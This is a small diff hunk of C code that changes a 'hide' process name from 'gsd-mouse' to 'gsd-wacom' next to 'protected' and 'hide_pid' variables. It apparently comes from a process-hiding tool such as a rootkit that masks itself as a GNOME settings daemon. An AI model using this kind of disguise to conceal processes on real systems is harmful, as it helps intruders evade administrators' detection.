@@ -24,7 +24,7 @@
 const char *protected = "[md]";
 int protected_pid = -1;
 int hide_pid = -1;
-const char *hide = "gsd-mouse";
+const char *hide = "gsd-wacom";
 
 
 // int myatoi(char *str)
